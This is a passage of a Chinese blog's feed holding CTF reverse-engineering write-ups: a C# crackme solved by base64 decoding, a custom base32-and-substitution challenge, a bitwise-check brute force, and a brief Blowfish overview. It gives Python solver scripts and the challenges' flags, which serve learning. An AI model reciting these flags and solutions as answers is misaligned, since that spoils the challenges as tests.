        <content type="html"><![CDATA[<html><head></head><body><h2 id="JarvisOJ-软件密码破解-1"><a href="#JarvisOJ-软件密码破解-1" class="headerlink" title="JarvisOJ-软件密码破解-1"></a>JarvisOJ-软件密码破解-1</h2><p>下载文件<a href="CrackMe.rar">点击下载</a></p><p>首先我们发现这是一个C#程序，对于c#程序我们都是要祭出dnSpy大杀器<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-1/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-1/1.png" class="lazyload"></a></p><p>其实单纯看代码，就已经知道如何得到flag了<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-1/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-1/2.png" class="lazyload"></a><br>就是将假码进行base64加密，然后与 “UENURntFYTV5X0RvX05ldF9DcjRjazNyfQ==” 进行比较</p><p>所以我们只需要将真码进行base64逆运算<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-1/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-1/3.png" class="lazyload"></a><br>得到flag：PCTF{Ea5y_Do_Net_Cr4ck3r}<br>总结：简直送分题！！！</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Re-安恒杯第二题</title>
      <link href="/2018/11/16/CTF-Re-AnHeng2/"/>
      <url>/2018/11/16/CTF-Re-AnHeng2/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="CTF-Re-安恒杯第二题"><a href="#CTF-Re-安恒杯第二题" class="headerlink" title="CTF-Re-安恒杯第二题"></a>CTF-Re-安恒杯第二题</h2><p>下载文件 <a href="BASE++_fix.rar">点击下载</a><br>首先把程序导入IDA进行分析，然后选中_main，然后F5大法<br><a href="/2018/11/16/CTF-Re-AnHeng2/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/16/CTF-Re-AnHeng2/1.png" class="lazyload"></a><br>通过简单的分析我们知道了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRLT5amLBoLT5Z6Fa5LqN6mkTomqR66Da4LqX5mgBwkkP5wmTZ6D====</span><br></pre></td></tr></tbody></table></figure></div><p>是真码，也就是我们需要逆向的密码。<br>在比较真码前一条代码进行F5<br><a href="/2018/11/16/CTF-Re-AnHeng2/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/16/CTF-Re-AnHeng2/2.png" class="lazyload"></a><br>发现是一个循环，循环里面还有一个call，继续进入F5<br><a href="/2018/11/16/CTF-Re-AnHeng2/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/16/CTF-Re-AnHeng2/3.png" class="lazyload"></a><br>经过简单的分析就是取出5个char，然后将前四个通过移位使得eax填满且恰好等于四个字符，比如31323334<br>然后将最后一个放到edx<br>然后将eax和0x1F进行与运算，运算完，右移2位，然后继续运算，edx也会进行运算，其实它的本质就是将5个字符的二进制模式下拆成5份，然后再5份5份的读出转化为数字，然后在一个密码表里当做序号的值转化为密文。<br>密码表如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NoPqRsTuVwXyZaBcDeFgHiJkLm765432</span><br></pre></td></tr></tbody></table></figure></div><p>所以我们只需将真码先通过密码表逆运算，算出我们与运算之后数据，代码如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">crypto_txt  = "TRLT5amLBoLT5Z6Fa5LqN6mkTomqR66Da4LqX5mgBwkkP5wmTZ6D===="</span><br><span class="line">table = "NoPqRsTuVwXyZaBcDeFgHiJkLm765432"</span><br><span class="line">base = [0,0,0,0,0,0,0,0]</span><br><span class="line">flag = [0,0,0,0,0,0,0,0]</span><br><span class="line">for i in range(0,55,8):</span><br><span class="line">    for j in range(0,8):</span><br><span class="line">        base[j] = crypto_txt[i+j]</span><br><span class="line">    for j in range(0,8):</span><br><span class="line">        flag[j] = 0;</span><br><span class="line">    for k in range(0,32):</span><br><span class="line">        for l in range(0,8):</span><br><span class="line">            if(table[k] == base[l]):</span><br><span class="line">                flag[l] = k;</span><br><span class="line">    flag[0] = flag[0]<<35</span><br><span class="line">    flag[1] = flag[1]<<30</span><br><span class="line">    flag[2] = flag[2]<<25</span><br><span class="line">    flag[3] = flag[3]<<20</span><br><span class="line">    flag[4] = flag[4]<<15</span><br><span class="line">    flag[5] = flag[5]<<10</span><br><span class="line">    flag[6] = flag[6]<<5</span><br><span class="line">    print ("%x"%(flag[0]+flag[1]+flag[2]+flag[3]+flag[4]+flag[5]+flag[6]+flag[7]))</span><br></pre></td></tr></tbody></table></figure></div><p>运行结果如下<br><a href="/2018/11/16/CTF-Re-AnHeng2/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/16/CTF-Re-AnHeng2/4.png" class="lazyload"></a></p><p>但是这个并不是最终的结果，因为前面还有很多代码，我们继续探索<br><a href="/2018/11/16/CTF-Re-AnHeng2/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/16/CTF-Re-AnHeng2/5.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_1161100(byte_1165018);</span><br></pre></td></tr></tbody></table></figure></div><p>上面那个call中，其实是对英文字母的偏移替换<br><a href="/2018/11/16/CTF-Re-AnHeng2/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/16/CTF-Re-AnHeng2/6.png" class="lazyload"></a></p><p>将小写替换为   (原码 - 84) % 26 +97<br>将大写替换为   (原码 - 52) % 26 +65</p><p>所以我们只需要将替换后的字母表输出出来，然后对着修正就好了<br>代码如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#31306e373870706e33726f30306f373072326f706f70357333726f7171393337000000</span><br><span class="line">str = "\x31\x30\x6e\x37\x38\x70\x70\x6e\x33\x72\x6f\x30\x30\x6f\x37\x30\x72\x32\x6f\x70\x6f\x70\x35\x73\x33\x72\x6f\x71\x71\x39\x33\x37\x00\x00\x00"</span><br><span class="line">table = []</span><br><span class="line">print str;</span><br><span class="line">for i in range(97,123):</span><br><span class="line">    j = (i - 84) % 26 + 97;</span><br><span class="line">    table.append(j);</span><br><span class="line">    print(chr(i)+" -> "+chr(j));</span><br><span class="line">for i in str:</span><br><span class="line">    if(0 <= (ord(i)-97) and (ord(i)-97) <= 27):</span><br><span class="line">        for j in range(0,27):</span><br><span class="line">            if(ord(i)-97 == j):</span><br><span class="line">                print chr(table[j]),</span><br><span class="line">        continue</span><br><span class="line">    print("%c"%i),</span><br></pre></td></tr></tbody></table></figure></div><p>效果如下<br><a href="/2018/11/16/CTF-Re-AnHeng2/7.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/16/CTF-Re-AnHeng2/7.png" class="lazyload"></a></p><p>明显flag就是<br>10a78cca3eb00b70e2bcbc5f3ebdd937</p><p>验证一下<br><a href="/2018/11/16/CTF-Re-AnHeng2/8.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/16/CTF-Re-AnHeng2/8.png" class="lazyload"></a><br>是正确的</p><p>总结：从这个Re中，我们学到了base的变种，还有字母表替换的灵活使用</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-实验吧-Re-bitwise</title>
      <link href="/2018/11/09/CTF-%E5%AE%9E%E9%AA%8C%E5%90%A7-Re-bitwise/"/>
      <url>/2018/11/09/CTF-%E5%AE%9E%E9%AA%8C%E5%90%A7-Re-bitwise/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>下载压缩包 <a href="bitwise.rar">bitwise.rar</a><br>解压后有如下文件<br><a href="/2018/11/09/CTF-%E5%AE%9E%E9%AA%8C%E5%90%A7-Re-bitwise/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/09/CTF-%E5%AE%9E%E9%AA%8C%E5%90%A7-Re-bitwise/1.png" class="lazyload"></a></p><p>打开 bitwise.py 和 bitewise.java 看一下源码<br><a href="/2018/11/09/CTF-%E5%AE%9E%E9%AA%8C%E5%90%A7-Re-bitwise/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/09/CTF-%E5%AE%9E%E9%AA%8C%E5%90%A7-Re-bitwise/2.png" class="lazyload"></a><br><a href="/2018/11/09/CTF-%E5%AE%9E%E9%AA%8C%E5%90%A7-Re-bitwise/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/09/CTF-%E5%AE%9E%E9%AA%8C%E5%90%A7-Re-bitwise/3.png" class="lazyload"></a></p><h3 id="发现代码的作用是一样的"><a href="#发现代码的作用是一样的" class="headerlink" title="发现代码的作用是一样的"></a>发现代码的作用是一样的</h3><p>关键代码且很明白的写在源码里面了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]</span><br><span class="line">user_arr.append( (((ord(char) << 5) | (ord(char) >> 3)) ^ 111) & 255 )</span><br></pre></td></tr></tbody></table></figure></div><p>简单来说就是:</p><h3 id="1-假码必须是10位"><a href="#1-假码必须是10位" class="headerlink" title="1.假码必须是10位"></a>1.假码必须是10位</h3><h3 id="2-假码通过-ord-char-lt-lt-5-ord-char-gt-gt-3-111-amp-255-运算后符合verify-arr的内容"><a href="#2-假码通过-ord-char-lt-lt-5-ord-char-gt-gt-3-111-amp-255-运算后符合verify-arr的内容" class="headerlink" title="2.假码通过 ((ord(char) << 5) | (ord(char) >> 3)) ^ 111) & 255 运算后符合verify_arr的内容"></a>2.假码通过 ((ord(char) << 5) | (ord(char) >> 3)) ^ 111) & 255 运算后符合verify_arr的内容</h3><p>那么我们有一个简单粗暴的思路</p><h3 id="因为我们输入的是ascii码，而ascii码我们可以输入的范围大概是在0x20-0x7E"><a href="#因为我们输入的是ascii码，而ascii码我们可以输入的范围大概是在0x20-0x7E" class="headerlink" title="因为我们输入的是ascii码，而ascii码我们可以输入的范围大概是在0x20-0x7E"></a>因为我们输入的是ascii码，而ascii码我们可以输入的范围大概是在0x20-0x7E</h3><h3 id="所以我们直接for循环0x20-0x7E范围内的字符，然后运算和真码进行比较，如果是正确的且唯一的话，就会输出出来"><a href="#所以我们直接for循环0x20-0x7E范围内的字符，然后运算和真码进行比较，如果是正确的且唯一的话，就会输出出来" class="headerlink" title="所以我们直接for循环0x20-0x7E范围内的字符，然后运算和真码进行比较，如果是正确的且唯一的话，就会输出出来"></a>所以我们直接for循环0x20-0x7E范围内的字符，然后运算和真码进行比较，如果是正确的且唯一的话，就会输出出来</h3><p>具体效果如下<br><a href="/2018/11/09/CTF-%E5%AE%9E%E9%AA%8C%E5%90%A7-Re-bitwise/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/09/CTF-%E5%AE%9E%E9%AA%8C%E5%90%A7-Re-bitwise/4.png" class="lazyload"></a></p><p>代码我也直接贴出来了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]</span><br><span class="line">user_arr = []</span><br><span class="line">p = ''</span><br><span class="line">for j in range(0,10):</span><br><span class="line">  for i in range(0x00,255):</span><br><span class="line">    if( (((i << 5) | (i >> 3)) ^ 111) & 255 == verify_arr[j] ):</span><br><span class="line">      p += chr(i)</span><br><span class="line">print(p)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学-Blowfish加密算法</title>
      <link href="/2018/11/09/Blowfish%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B/"/>
      <url>/2018/11/09/Blowfish%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Blowfish简单介绍"><a href="#Blowfish简单介绍" class="headerlink" title="Blowfish简单介绍"></a>Blowfish简单介绍</h1><p>Blowfish一共有两个处理步骤<br>1、将pBox和sBox通过key进行变化。<br>    首先pBox和sBox是恒定的固定值<br>    而key是我们自己输入的文本【一般是8位】<br>2、将欲加密文本通过key进行xor、add等简单运算符进行运算，最后得出密文</p><h1 id="简单来说一般为以下几个步骤"><a href="#简单来说一般为以下几个步骤" class="headerlink" title="简单来说一般为以下几个步骤:"></a>简单来说一般为以下几个步骤:</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">translate_key = translate(key,8); // translate函数中一般已经包含了pBox和sBox了</span><br><span class="line">chipher_text = Blowfish(translate_key,text,8);</span><br></pre></td></tr></tbody></table></figure></div><h2 id="以上代码发现"><a href="#以上代码发现" class="headerlink" title="以上代码发现"></a>以上代码发现</h2><p>Blowfish一般是8位8位加密数据,即key也要是8位,欲加密的文本被拆成8位一份进行加密</p></body></html>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
